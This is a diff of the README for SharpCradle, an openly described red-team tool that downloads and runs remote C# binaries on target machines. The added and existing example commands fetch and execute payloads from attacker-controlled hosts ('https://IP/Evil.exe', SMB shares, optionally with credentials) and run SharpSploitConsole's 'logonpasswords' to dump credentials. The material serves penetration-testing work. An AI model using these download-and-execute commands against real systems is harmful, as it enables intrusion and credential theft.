@@ -8,6 +8,10 @@ SharpCradle is a tool designed to help penetration testers or red teams download
 Contact at:
 - Twitter: @anthemtotheego
 
+Quick blog:
+
+http://blog.redxorblue.com/2018/10/sharpcradle-loading-remote-c-binaries.html
+
 **Before submitting issues, this tool may not always be updated actively. I encourage you to borrow, add, mod, and/or make your own.  Remember, all the awesome code out there (and there is a lot) can be taken/modified to create your own custom tools.**
 
 ![Alt text](/SCradle.PNG?raw=true "SharpSploitConsole")
@@ -20,19 +24,27 @@ Setup - Quick and Dirty
 
 1. Download SharpCradle tool and open up SharpCradle.sln                         
 
-2. Compile, drop binary on target computer and have fun.
+2. Compile for correct architecture (x64 or x86), drop binary on target computer and have fun.
+
+Note: architecture of SharpCradle and binary you are retrieving should be the same or it might throw errors.
 
 Examples 
 ========
 
 Web Server Download:
 
+```SharpCradle.exe -w https://IP/Evil.exe <arguments to pass>```
+
 ```SharpCradle.exe -w https://IP/SharpSploitConsole_x64.exe logonpasswords```
 
 File Server Download Anonymous:
 
+```SharpCradle.exe -f \\IP\share\Evil.exe <arguments to pass>```
+
 ```SharpCradle.exe -f \\IP\share\SharpSploitConsole_x64.exe logonpasswords```
 
 File Server Download With Creds:
+
+```SharpCradle.exe -f -c domain username password \\IP\share\Evil.exe <arguements to pass>```
 
 ```SharpCradle.exe -f -c domain username password \\IP\share\SharpSploitConsole_x64.exe logonpasswords```
